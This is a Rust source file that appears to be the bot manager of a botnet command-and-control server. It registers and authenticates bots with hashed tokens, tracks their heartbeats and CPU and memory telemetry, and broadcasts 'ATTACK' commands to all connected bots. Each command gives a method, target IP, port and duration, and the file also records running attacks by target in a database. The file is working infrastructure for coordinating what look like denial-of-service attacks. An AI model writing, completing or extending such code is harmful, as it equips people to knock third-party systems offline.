use tokio::sync::Mutex;
use std::sync::Arc;
use std::net::SocketAddr;
use chrono::{DateTime, Utc};
use uuid::Uuid;
use serde::{Deserialize, Serialize};
use sha2::{Sha256, Digest};
use dashmap::DashMap;
use sqlx::{SqlitePool, Row};

/// Bot token information for authentication
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct BotToken {
    pub token_hash: String,  // SHA256 hash of token
    pub bot_id: Uuid,
    pub arch: String,
    pub created_at: DateTime<Utc>,
    pub last_used: Option<DateTime<Utc>>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct BotInfo {
    pub id: Uuid,
    pub arch: String,
    pub version: String,
    pub ip: SocketAddr,
    pub connected_at: DateTime<Utc>,
    pub last_seen: DateTime<Utc>,
    pub is_alive: bool,
    pub active_attack_id: Option<usize>,
    pub last_error: Option<String>,
}

impl BotInfo {
    pub fn new(ip: SocketAddr, arch: String, version: String) -> Self {
        let now = Utc::now();
        Self {
            id: Uuid::new_v4(),
            arch,
            version,
            ip,
            connected_at: now,
            last_seen: now,
            is_alive: true,
            active_attack_id: None,
            last_error: None,
        }
    }
    
    pub fn update_last_seen(&mut self) {
        self.last_seen = Utc::now();
    }

    pub fn set_error(&mut self, error: String) {
        self.last_error = Some(error);
    }
}

pub struct Bot {
    pub info: Arc<Mutex<BotInfo>>,
    pub cmd_tx: tokio::sync::mpsc::Sender<String>,
}

impl Bot {
    pub fn new(addr: SocketAddr, arch: String, version: String, cmd_tx: tokio::sync::mpsc::Sender<String>) -> Self {
        Self {
            info: Arc::new(Mutex::new(BotInfo::new(addr, arch, version))),
            cmd_tx,
        }
    }
}

pub struct BotManager {
    bots: Arc<DashMap<Uuid, Arc<Bot>>>,
    max_connections: usize,
    pool: SqlitePool,
}

impl BotManager {
    pub fn new(max_connections: usize, pool: SqlitePool) -> Self {
        Self {
            bots: Arc::new(DashMap::new()),
            max_connections,
            pool,
        }
    }
    
    /// Hash a token using SHA256
    fn hash_token(token: &str) -> String {
        let mut hasher = Sha256::new();
        hasher.update(token.as_bytes());
        format!("{:x}", hasher.finalize())
    }
    
    /// Register a new bot and return its token (ONLY SHOWN ONCE!)
    pub async fn register_bot(&self, arch: String) -> Result<(Uuid, String), String> {
        let bot_id = Uuid::new_v4();
        let token = generate_secure_token(64);  // 64 char token for better security
        
        // Hash the token for storage - never store plaintext!
        let token_hash = Self::hash_token(&token);
        let now = Utc::now();
        
        sqlx::query("INSERT INTO bot_tokens (token_hash, bot_id, arch, created_at) VALUES (?, ?, ?, ?)")
            .bind(&token_hash)
            .bind(bot_id.to_string())
            .bind(&arch)
            .bind(now)
            .execute(&self.pool)
            .await
            .map_err(|e| format!("Database error: {}", e))?;
        
        tracing::info!("Registered new bot {} - TOKEN WILL BE SHOWN ONLY ONCE!", bot_id);
        Ok((bot_id, token))
    }
    
    /// Verify a bot token and return bot ID and arch if valid
    pub async fn verify_bot_token(&self, token: &str) -> Option<(Uuid, String)> {
        let token_hash = Self::hash_token(token);
        
        let row = sqlx::query("SELECT bot_id, arch FROM bot_tokens WHERE token_hash = ?")
            .bind(&token_hash)
            .fetch_optional(&self.pool)
            .await
            .ok()??;

        let bot_id_str: String = row.get("bot_id");
        let arch: String = row.get("arch");
        let bot_id = Uuid::parse_str(&bot_id_str).ok()?;

        // Update last_used
        let _ = sqlx::query("UPDATE bot_tokens SET last_used = ? WHERE token_hash = ?")
            .bind(Utc::now())
            .bind(&token_hash)
            .execute(&self.pool)
            .await;

        Some((bot_id, arch))
    }
    
    /// Revoke a bot token by Bot ID
    pub async fn revoke_token(&self, bot_id: Uuid) -> Result<(), String> {
        let result = sqlx::query("DELETE FROM bot_tokens WHERE bot_id = ?")
            .bind(bot_id.to_string())
            .execute(&self.pool)
            .await
            .map_err(|e| format!("Database error: {}", e))?;

        if result.rows_affected() == 0 {
            return Err(format!("No token found for bot ID {}", bot_id));
        }
        
        tracing::info!("Revoked bot token for bot {}", bot_id);
        Ok(())
    }
    
    /// List all registered bot tokens
    pub async fn list_tokens(&self) -> Vec<BotToken> {
        let rows = sqlx::query("SELECT token_hash, bot_id, arch, created_at, last_used FROM bot_tokens")
            .fetch_all(&self.pool)
            .await
            .unwrap_or_default();

        rows.into_iter().filter_map(|row| {
            let bot_id_str: String = row.get("bot_id");
            let bot_id = Uuid::parse_str(&bot_id_str).ok()?;
            Some(BotToken {
                token_hash: row.get("token_hash"),
                bot_id,
                arch: row.get("arch"),
                created_at: row.get("created_at"),
                last_used: row.get("last_used"),
            })
        }).collect()
    }
    
    pub async fn add_bot(&self, bot: Bot) -> Result<Arc<Bot>, String> {
        if self.bots.len() >= self.max_connections {
            return Err(format!("Max bot connections reached: {}", self.max_connections));
        }
        
        let bot_id = bot.info.lock().await.id;
        let bot_arc = Arc::new(bot);
        self.bots.insert(bot_id, bot_arc.clone());
        Ok(bot_arc)
    }
    
    pub async fn remove_bot(&self, bot_id: &Uuid) {
        self.bots.remove(bot_id);
    }
    
    pub async fn get_bot_count(&self) -> usize {
        self.bots.len()
    }
    
    pub async fn get_all_bots(&self) -> Vec<Arc<Bot>> {
        self.bots.iter().map(|r| r.value().clone()).collect()
    }
    
    #[allow(dead_code)]
    pub async fn get_bots_by_arch(&self, arch: &str) -> Vec<Arc<Bot>> {
        let mut result = Vec::new();
        
        for bot in self.bots.iter() {
            let info = bot.value().info.lock().await;
            if info.arch == arch {
                result.push(bot.value().clone());
            }
        }
        
        result
    }
    
    pub async fn update_bot_heartbeat(&self, bot_id: &Uuid) {
        if let Some(bot) = self.bots.get(bot_id) {
            let mut info = bot.info.lock().await;
            info.update_last_seen();
        }
    }

    pub async fn set_bot_error(&self, bot_id: &Uuid, error: String) {
        if let Some(bot) = self.bots.get(bot_id) {
            let mut info = bot.info.lock().await;
            info.set_error(error);
        }
    }
    
    pub async fn log_telemetry(&self, bot_id: Uuid, cpu: f32, mem: f32) {
        let _ = sqlx::query("INSERT INTO bot_telemetry (bot_id, cpu_usage, memory_usage) VALUES (?, ?, ?)")
            .bind(bot_id.to_string())
            .bind(cpu)
            .bind(mem)
            .execute(&self.pool)
            .await;
    }

    pub async fn cleanup_dead_bots(&self, timeout_secs: i64) {
        let now = Utc::now();
        let mut to_remove = Vec::new();
        
        for bot in self.bots.iter() {
            let info = bot.value().info.lock().await;
            let elapsed = now.signed_duration_since(info.last_seen);
            if elapsed.num_seconds() >= timeout_secs {
                to_remove.push(*bot.key());
            }
        }
        
        for id in to_remove {
            self.bots.remove(&id);
        }
    }
    
    /// Broadcast stop command to all bots for a specific attack
    pub async fn broadcast_stop(&self, attack_id: usize) {
        let command = format!("STOP {}\n", attack_id);
        let bots = self.get_all_bots().await;
        
        for bot in bots {
            if let Err(e) = bot.cmd_tx.send(command.clone()).await {
                tracing::debug!("Failed to send stop command to bot: {}", e);
            }
        }
    }
    
    /// Broadcast attack command to all bots
    pub async fn broadcast_attack(&self, attack_id: usize, method: &str, ip: &str, port: u16, duration: u64) {
        // Protocol: ATTACK <id> <method> <ip> <port> <duration>
        let command = format!("ATTACK {} {} {} {} {}\n", attack_id, method, ip, port, duration);
        let bots = self.get_all_bots().await;
        
        for bot in bots {
            if let Err(e) = bot.cmd_tx.send(command.clone()).await {
                tracing::debug!("Failed to send attack command to bot: {}", e);
            }
        }
    }

    /// Get all currently active attacks from the database
    pub async fn get_active_attacks(&self) -> Vec<(usize, String, String, u16, u64)> {
        let rows = sqlx::query("SELECT id, method, target_ip, target_port, duration, started_at FROM attacks WHERE status = 'running'")
            .fetch_all(&self.pool)
            .await
            .unwrap_or_default();

        let mut active_attacks = Vec::new();
        let now = Utc::now();

        for row in rows {
            let id: i64 = row.get("id");
            let method: String = row.get("method");
            let ip: String = row.get("target_ip");
            let port: u16 = row.get("target_port");
            let duration: i64 = row.get("duration");
            let started_at: DateTime<Utc> = row.get("started_at");

            // Check if still valid
            let elapsed = now.signed_duration_since(started_at).num_seconds();
            if elapsed < duration {
                let remaining = (duration - elapsed) as u64;
                active_attacks.push((id as usize, method, ip, port, remaining));
            }
        }
        active_attacks
    }
}

/// Generate a secure random token
fn generate_secure_token(length: usize) -> String {
    use rand::Rng;
    const CHARSET: &[u8] = b"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    let mut rng = rand::rngs::OsRng;
    
    (0..length)
        .map(|_| {
            let idx = rng.gen_range(0..CHARSET.len());
            CHARSET[idx] as char
        })
        .collect()
}
